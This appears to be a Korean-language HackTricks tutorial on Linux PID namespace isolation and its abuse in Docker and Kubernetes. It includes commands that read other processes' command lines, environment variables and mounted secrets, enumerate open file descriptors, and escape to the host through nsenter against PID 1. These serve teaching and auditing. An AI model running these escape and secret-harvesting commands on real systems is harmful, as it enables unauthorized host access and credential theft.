# PID 네임스페이스

{{#include ../../../../../banners/hacktricks-training.md}}

## 개요

PID 네임스페이스는 프로세스 번호가 매겨지는 방식과 어떤 프로세스가 표시되는지를 제어합니다. 그래서 컨테이너는 실제 머신이 아니더라도 자체 PID 1을 가질 수 있습니다. 네임스페이스 내부에서 워크로드는 로컬 프로세스 트리처럼 보이는 것을 확인합니다. 네임스페이스 외부에서 호스트는 실제 호스트 PID와 전체 프로세스 구성을 계속 확인합니다.<sup>[[3]](#references)</sup>

보안 관점에서 PID 네임스페이스가 중요한 이유는 프로세스의 가시성이 유용한 정보이기 때문입니다. 워크로드가 호스트 프로세스를 볼 수 있게 되면 서비스 이름, 명령줄 인자, 프로세스 인자로 전달된 비밀 정보, `/proc`을 통한 환경 변수 기반 상태, 잠재적인 네임스페이스 진입 대상을 관찰할 수 있습니다. 적절한 조건에서 신호를 보내거나 ptrace를 사용하는 등 단순히 프로세스를 보는 것 이상의 행위가 가능하다면 문제는 훨씬 심각해집니다.

## 동작 방식

새 PID 네임스페이스는 자체적인 내부 프로세스 번호 체계로 시작합니다. 네임스페이스 내부에서 생성된 첫 번째 프로세스는 해당 네임스페이스 관점에서 PID 1이 되며, 고아 자식 프로세스와 신호 처리에서 init과 비슷한 특별한 동작을 합니다. 이로 인해 컨테이너의 init 프로세스, 좀비 프로세스 회수, 컨테이너에서 작은 init 래퍼를 사용하는 이유 등 여러 특이 동작을 설명할 수 있습니다.<sup>[[3]](#references)</sup>

PID 네임스페이스는 계층 구조를 이룹니다. 상위 네임스페이스의 프로세스는 해당 상위 네임스페이스에서 할당된 PID를 사용해 하위 네임스페이스의 프로세스를 지정할 수 있지만, 하위 네임스페이스에서는 일반적인 PID 기반 시스템 호출을 사용하거나 상위 PID 네임스페이스로 `setns()`를 호출해 상위 네임스페이스에만 속한 작업을 지정할 수 없습니다. 하위 네임스페이스에 의도적으로 노출된 상위 네임스페이스 소유의 procfs는 여전히 상위 네임스페이스의 프로세스 뷰를 leak할 수 있습니다. 또한 `setns()`로 PID 네임스페이스에 들어가면 호출자 자신이 아니라 **향후 자식 프로세스**에 네임스페이스가 적용되므로, 도구는 진입 후 fork합니다. procfs 마운트는 마운트한 프로세스의 PID 뷰를 유지합니다. 따라서 `unshare(CLONE_NEWPID)` 이후 새 procfs를 만드는 것은 단순한 외관상의 문제가 아니라 보안과 관련이 있습니다.<sup>[[3]](#references)</sup>

중요한 보안 교훈은 프로세스가 자체 PID 트리만 보므로 격리된 것처럼 보일 수 있지만, 그 격리는 의도적으로 해제될 수 있다는 것입니다. Docker에서는 `--pid=host`로, Kubernetes에서는 `hostPID: true`로 이를 설정할 수 있습니다. 컨테이너가 호스트 PID 네임스페이스에 참여하면 워크로드는 호스트 프로세스를 직접 확인할 수 있으며, 이후의 여러 공격 경로가 훨씬 현실적으로 가능해집니다.

## 실습

PID 네임스페이스를 수동으로 만들려면:

```bash
sudo unshare --pid --fork --mount-proc bash
ps -ef
echo $$
```

셸은 이제 비공개 프로세스 뷰를 봅니다. `--mount-proc` 플래그가 중요한 이유는 새 PID namespace에 맞는 procfs 인스턴스를 마운트하여 내부에서 프로세스 목록이 일관되게 보이도록 하기 때문입니다.<sup>[[3]](#references)</sup>

컨테이너 동작을 비교하려면:

```bash
docker run --rm debian:stable-slim ps -ef
docker run --rm --pid=host debian:stable-slim ps -ef | head
```

그 차이는 즉시 이해할 수 있을 만큼 명확하므로, 독자를 위한 첫 실습으로 적합합니다.

## Runtime Usage

Docker, Podman, containerd, CRI-O의 일반 컨테이너는 각각 자체 PID namespace를 사용합니다. Kubernetes 컨테이너는 보통 서로 분리된 PID 뷰를 사용하며, `shareProcessNamespace: true`를 설정하면 의도적으로 Pod 전체가 하나의 뷰를 공유합니다.<sup>[[4]](#references)</sup> 반면 `hostPID: true`는 노드의 PID namespace를 선택합니다. LXC/Incus 환경도 동일한 커널 기능을 사용하지만, 시스템 컨테이너의 사용 사례에서는 프로세스 트리가 더 복잡해지고 디버깅을 위한 편법이 쓰일 수 있습니다.

어디서나 동일한 규칙이 적용됩니다. runtime이 PID namespace를 격리하지 않도록 선택했다면, 이는 컨테이너 경계를 의도적으로 완화한 것입니다.

## Misconfigurations

대표적인 misconfiguration은 host PID 공유입니다. 팀에서는 디버깅, 모니터링 또는 서비스 관리의 편의를 위해 이를 정당화하는 경우가 많지만, 항상 중요한 보안 예외로 취급해야 합니다. 컨테이너에 호스트 프로세스를 직접 수정할 수단이 없더라도, 프로세스를 볼 수 있다는 사실만으로도 시스템에 관한 많은 정보를 알아낼 수 있습니다. `CAP_SYS_PTRACE`와 같은 capability나 유용한 procfs 접근 권한이 추가되면 위험은 크게 커집니다.

또 다른 실수는 워크로드가 기본적으로 호스트 프로세스를 종료하거나 ptrace할 수 없으므로 host PID 공유는 무해하다고 가정하는 것입니다. 이러한 결론은 열거의 가치, namespace 진입 대상으로 활용할 수 있는 프로세스의 존재, 그리고 PID 가시성이 다른 약화된 제어와 결합되는 방식을 간과합니다.

### Kubernetes Pod-wide process sharing

`shareProcessNamespace: true`는 `hostPID`와 다릅니다. 노드 프로세스가 아니라 **같은 Pod의 다른 컨테이너** 프로세스를 노출합니다. 그러면 침해된 sidecar 또는 debug 컨테이너는 procfs 접근 검사에 따라 같은 Pod 내 다른 컨테이너의 명령줄과 환경 데이터를 열거하고, 자격 증명으로 허용되는 경우 신호를 보내며, `/proc/<pid>/root`를 통해 다른 컨테이너의 파일 시스템을 탐색할 수 있습니다. Kubernetes는 이 경우 명령줄/환경 변수의 비밀 정보와 컨테이너 파일 시스템이 해당 Unix 권한에 의해서만 보호된다고 명시적으로 경고합니다.<sup>[[4]](#references)</sup>

유용한 클러스터 측 점검:

```bash
kubectl get pods -A -o json | jq -r '
  .items[] |
  select(.spec.hostPID == true or .spec.shareProcessNamespace == true) |
  [.metadata.namespace,.metadata.name,
   (.spec.hostPID // false),(.spec.shareProcessNamespace // false)] | @tsv'
```

Pod 전체 PID namespace의 침해된 컨테이너에서는 가시성이 읽기 권한과 같다고 가정하지 말고, 먼저 실제 접근이 가능한지 테스트하세요:<sup>[[4]](#references)</sup>

```bash
victim=$(ps -eo pid,args | awk '/[n]ginx|[j]ava|[p]ython/{print $1; exit}')
[ -n "$victim" ] || { echo "No candidate process found"; exit 1; }
tr '\0' ' ' < "/proc/$victim/cmdline" 2>/dev/null; echo
tr '\0' '\n' < "/proc/$victim/environ" 2>/dev/null | sed -n '1,20p'
find "/proc/$victim/root/run/secrets" -maxdepth 2 -type f -ls 2>/dev/null
```

### 기존 Kubernetes Pod의 특정 ephemeral container

`pods/ephemeralcontainers`를 수정할 수 있는 Kubernetes identity는 `shareProcessNamespace`가 설정되지 않은 경우에도 실행 중인 Pod에 debugger를 추가할 수 있습니다. `--target`을 사용하면 runtime이 namespace targeting을 지원하는 경우 debugger가 지정된 container의 프로세스 네임스페이스에 합류합니다. 이렇게 하면 해당 container의 프로세스를 볼 수 있지만, 노드의 호스트 PID 네임스페이스에는 접근할 수 없습니다.<sup>[[5]](#references)</sup>

API는 별도의 subresource를 사용하므로, 일반 Pod 쓰기 권한으로 해당 권한까지 포함된다고 가정하지 말고 `patch`/`update` 권한을 확인하세요.<sup>[[6]](#references)</sup>

권한이 있는 namespace의 Pod 및 container를 대상으로 다음과 같이 확인합니다:<sup>[[5]](#references)[[6]](#references)</sup>

```bash
ns=default; pod=myapp; container=app
kubectl auth can-i get pods -n "$ns"
kubectl auth can-i patch pods/ephemeralcontainers -n "$ns"
kubectl auth can-i update pods/ephemeralcontainers -n "$ns"
kubectl auth can-i create pods/attach -n "$ns"
kubectl -n "$ns" debug -it "pod/$pod" --image=busybox:1.36 --target="$container" -- sh
# In the debug shell: verify the target processes are actually visible.
ps -ef
```

runtime에서 targeting을 구현하지 않았다면 debugger가 시작되지 않거나 격리된 PID namespace에 남아 있을 수 있습니다.<sup>[[5]](#references)</sup> targeting이 작동한다면 [Kubernetes Pod-wide process sharing](#kubernetes-pod-wide-process-sharing)에 있는 검사를 사용해 `/proc/<pid>` 접근을 테스트하세요. 프로세스를 볼 수 있다고 해서 대상의 비밀 정보를 읽거나 신호를 보낼 권한이 있는 것은 아닙니다. Unix credentials와 procfs 접근 검사는 여전히 적용됩니다.<sup>[[4]](#references)[[8]](#references)</sup> Pod Security Standards는 ephemeral containers의 privileged 설정도 제한합니다.<sup>[[7]](#references)</sup>

## 악용

host PID namespace가 공유되어 있다면 공격자는 host 프로세스를 살펴보고, 프로세스 인자를 수집하고, 흥미로운 서비스를 식별하고, `nsenter`에 사용할 후보 PID를 찾거나, 프로세스 가시성과 ptrace 관련 권한을 결합해 host 또는 인접 워크로드를 방해할 수 있습니다. 경우에 따라 적절한 장기 실행 프로세스를 발견하는 것만으로도 나머지 공격 계획을 재구성하기에 충분합니다.

첫 번째 실질적인 단계는 항상 host 프로세스가 실제로 보이는지 확인하는 것입니다:

```bash
readlink /proc/self/ns/pid
ps -ef | head -n 50
ls /proc | grep '^[0-9]' | head -n 20
```

호스트 PID가 보이면, 프로세스 인수와 네임스페이스 진입 대상이 가장 유용한 정보원이 되는 경우가 많습니다:

```bash
for p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do
  echo "PID=$p"
  tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
done
```

`nsenter`를 사용할 수 있고 충분한 권한이 있다면, 보이는 호스트 프로세스를 네임스페이스 브리지로 사용할 수 있는지 테스트합니다:

```bash
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "nsenter blocked"
```

진입이 차단되더라도 호스트 PID 공유만으로도 서비스 구성, 런타임 구성 요소, 다음 대상으로 삼을 후보 권한 프로세스를 파악하는 데 유용합니다. PID가 보인다고 해서 signal을 보내거나, trace하거나, 민감한 `/proc/<pid>` 항목을 읽거나, 대상의 다른 namespace에 합류할 권한까지 주어지는 것은 **아닙니다**. 자격 증명, dumpability, 대상 namespace를 소유한 user namespace의 capabilities, Yama/LSM 정책, seccomp도 여전히 영향을 미칩니다.<sup>[[3]](#references)</sup> 프로세스 인젝션 예시는 [CAP_SYS_PTRACE](../../../../interesting-files-permissions/linux-capabilities.md#cap_sys_ptrace)를 참조하세요.

호스트 PID가 보이면 파일 디스크립터 악용도 더 현실적인 위협이 됩니다. 권한이 높은 호스트 프로세스나 인접 워크로드가 민감한 파일 또는 소켓을 열어 둔 경우, ptrace 방식의 검사, 소유권, procfs 마운트 옵션, 객체 유형, 대상 서비스 모델에 따라 공격자가 `/proc/<pid>/fd/`를 살펴보고 기본 객체에 접근할 수 있습니다. FD 심볼릭 링크가 보인다는 사실만으로 해당 링크를 열 수 있는 것은 아니며, `/proc/<pid>/fd/N` 심볼릭 링크를 여는 것만으로 소켓을 복제할 수도 없습니다. 별개의 `pidfd_getfd()` primitive와 그 권한 확인 절차는 [Linux ptrace exit-race pidfd FD theft](../../../../main-system-information/kernel-lpe-cves/linux-ptrace-exit-race-pidfd_getfd-fd-theft.md)를 참조하세요.<sup>[[3]](#references)</sup>

```bash
for fd_dir in /proc/[0-9]*/fd; do
  ls -l "$fd_dir" 2>/dev/null | sed "s|^|$fd_dir -> |"
done
grep " /proc " /proc/mounts
```

이 명령은 `hidepid=1` 또는 `hidepid=2`가 프로세스 간 가시성을 제한하는지, 그리고 열린 secret 파일, 로그 또는 Unix 소켓과 같이 명백히 중요한 파일 디스크립터가 아예 보이는지 확인하는 데 유용합니다.

### 전체 예시: host PID + `nsenter`

프로세스가 host namespaces에 참여하고 host 프로세스의 root를 채택하는 데 필요한 capabilities를 갖고 있으면, host PID 공유로 host escape가 가능해질 수 있습니다. 후자를 위해 `nsenter --root` (`-r`)가 필요합니다. mount namespace만 변경해서는 호출자의 root 디렉터리가 바뀌지 않습니다.<sup>[[9]](#references)</sup> `/proc/1/root`에 접근할 때는 ptrace read 검사가 적용되며, root를 변경하려면 호출자의 user namespace에서 `CAP_SYS_CHROOT`가 필요합니다.<sup>[[8]](#references)[[10]](#references)</sup>

```bash
ps -ef | head -n 50
capsh --print | grep -E 'cap_sys_admin|cap_sys_chroot'
nsenter -t 1 -m -u -n -i -p -r -W / -- /bin/sh
```

명령이 성공하면 새 shell은 host의 mount, UTS, network, IPC 및 PID namespaces와 PID 1의 root filesystem을 사용합니다. PID가 보인다는 사실만으로 host 권한을 얻었다고 가정하지 말고, 실제 유효한 identity와 접근 권한을 확인하세요.<sup>[[9]](#references)</sup>

`nsenter` 자체가 없더라도 host filesystem이 mount되어 있다면 host 바이너리를 통해 같은 결과를 얻을 수 있습니다:

```bash
/host/usr/bin/nsenter -t 1 -m -u -n -i -p -r -W / -- /bin/sh 2>/dev/null
```

### 최근 Runtime 참고 사항

일부 PID namespace 관련 공격은 전통적인 `hostPID: true` 오설정이 아니라, 컨테이너 설정 중 procfs 보호를 적용하는 방식과 관련된 runtime 구현 버그입니다.

#### `maskedPaths`를 이용한 host procfs race

취약한 `runc` 버전에서는 컨테이너 이미지나 `runc exec` 워크로드를 제어할 수 있는 공격자가 컨테이너 측 `/dev/null`을 `/proc/sys/kernel/core_pattern` 같은 민감한 procfs 경로를 가리키는 심볼릭 링크로 교체해 마스킹 단계를 race할 수 있었습니다. race에 성공하면 masked-path bind mount가 잘못된 대상에 적용되어 새 컨테이너에 호스트 전역 procfs 설정이 노출될 수 있었습니다.<sup>[[1]](#references)</sup>

유용한 검토 명령:

```bash
jq '.linux.maskedPaths' config.json 2>/dev/null
```

이는 최종 영향이 procfs를 직접 노출한 경우와 같을 수 있으므로 중요합니다. 쓰기 가능한 `core_pattern` 또는 `sysrq-trigger`를 통해 호스트에서 코드 실행이 발생하거나 서비스 거부가 일어날 수 있습니다. 전용 [masked paths](../masked-paths.md) 및 [sensitive host mounts](../../sensitive-host-mounts.md) 페이지에서 일반적인 procfs 공격 표면을 다루므로, 여기서는 중복해서 다루지 않습니다.

#### Namespace injection: insject 사용

`insject`와 같은 Namespace injection 도구는 프로세스를 생성하기 전에 대상 namespace에 미리 진입하지 않아도 PID namespace와 상호작용할 수 있음을 보여 줍니다. helper는 나중에 연결해 `setns()`를 사용하고, 대상 PID 공간에 대한 가시성을 유지한 채 실행할 수 있습니다:<sup>[[2]](#references)</sup>

```bash
sudo insject -S -p $(pidof containerd-shim) -- bash -lc 'readlink /proc/self/ns/pid && ps -ef'
```

이러한 기법은 주로 runtime이 이미 workload를 초기화한 뒤 namespace 컨텍스트에 합류해야 하는 고급 디버깅, offensive tooling, post-exploitation 워크플로에서 중요합니다.

### 관련 FD 악용 패턴

호스트 PID가 보이는 경우 명시적으로 짚고 넘어갈 만한 패턴이 두 가지 있습니다. 첫째, 권한이 있는 프로세스가 `O_CLOEXEC`로 표시되지 않은 민감한 file descriptor를 `execve()` 이후에도 열어 둔 채 유지할 수 있습니다. 둘째, 서비스는 `SCM_RIGHTS`를 통해 Unix 소켓으로 file descriptor를 전달할 수 있습니다. 두 경우 모두 중요한 것은 더 이상 경로명이 아니라, 권한이 낮은 프로세스가 상속하거나 전달받을 수 있는 이미 열린 핸들입니다.

컨테이너에서 작업할 때 이 점이 중요한 이유는, 경로 자체는 컨테이너 파일시스템에서 직접 접근할 수 없더라도 해당 핸들이 `docker.sock`, 권한이 있는 로그, 호스트의 비밀 파일 또는 그 밖의 중요한 객체를 가리킬 수 있기 때문입니다.

## 검사

이 명령의 목적은 프로세스가 자체 PID 뷰를 갖는지, 아니면 이미 훨씬 더 넓은 프로세스 환경을 열거할 수 있는지 확인하는 것입니다.

```bash
readlink /proc/self/ns/{pid,pid_for_children,user,mnt}
grep -E '^(Name|Pid|PPid|NSpid|Uid|Gid|TracerPid):' /proc/self/status
ps -ef | head
findmnt -no TARGET,FSTYPE,OPTIONS /proc
cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null
capsh --print 2>/dev/null | grep -E 'Current:|Bounding'
```

여기서 흥미로운 점은 다음과 같습니다:<sup>[[3]](#references)</sup>

- 프로세스 목록에 명백한 호스트 서비스가 포함되어 있다면, host PID 공유가 이미 적용되었을 가능성이 높습니다.
- 컨테이너 내부의 작은 트리만 보이는 것이 일반적인 기본 상태입니다. `systemd`, `dockerd` 또는 관련 없는 데몬이 보이는 것은 그렇지 않습니다.
- `NSpid`를 통해 중첩된 namespace 간의 PID 매핑을 확인할 수 있습니다. 가장 왼쪽 값은 procfs 마운트와 연결된 PID namespace 기준이며, 그 뒤로 중첩된 각 namespace의 값이 이어집니다.
- `readlink /proc/self/ns/pid`만으로는 `hostPID`를 증명할 수 없습니다. 격리된 컨테이너에도 유효한 PID namespace inode가 있기 때문입니다. 프로세스 목록, procfs 마운트, 런타임 설정, 그리고 확인할 수 있다면 호스트 측 namespace inode를 함께 비교하세요.
- 호스트 PID가 보이면 읽기 전용 프로세스 정보만으로도 유용한 정찰이 가능합니다.

host PID 공유가 활성화된 컨테이너를 발견했다면, 이를 단순한 외형상의 차이로 취급하지 마세요. 이는 워크로드가 관찰하고 잠재적으로 영향을 미칠 수 있는 범위를 크게 바꾸는 설정입니다.





## References

- [1] [runc 보안 권고: 마운트 경쟁 조건으로 인한 "masked path" 악용을 통한 컨테이너 탈출 (CVE-2025-31133)](https://github.com/opencontainers/runc/security/advisories/GHSA-9493-h29p-rfm2)
- [2] [도구 릴리스 – insject: Linux Namespace Injector](https://www.nccgroup.com/research-blog/tool-release-insject-a-linux-namespace-injector/)
- [3] [Linux man-pages 6.19 책](https://www.kernel.org/pub/linux/docs/man-pages/book/man-pages-6.19.pdf)
- [4] [Pod의 컨테이너 간 Process Namespace 공유](https://kubernetes.io/docs/tasks/configure-pod-container/share-process-namespace/)
- [5] [실행 중인 Pod 디버깅](https://kubernetes.io/docs/tasks/debug/debug-application/debug-running-pod/)
- [6] [Ephemeral Containers KEP](https://www.kubernetes.dev/resources/keps/277/)
- [7] [Pod 보안 표준](https://kubernetes.io/docs/concepts/security/pod-security-standards/)
- [8] [proc_pid_root(5)](https://man7.org/linux/man-pages/man5/proc_pid_root.5.html)
- [9] [nsenter(1)](https://man7.org/linux/man-pages/man1/nsenter.1.html)
- [10] [chroot(2)](https://man7.org/linux/man-pages/man2/chroot.2.html)
{{#include ../../../../../banners/hacktricks-training.md}}
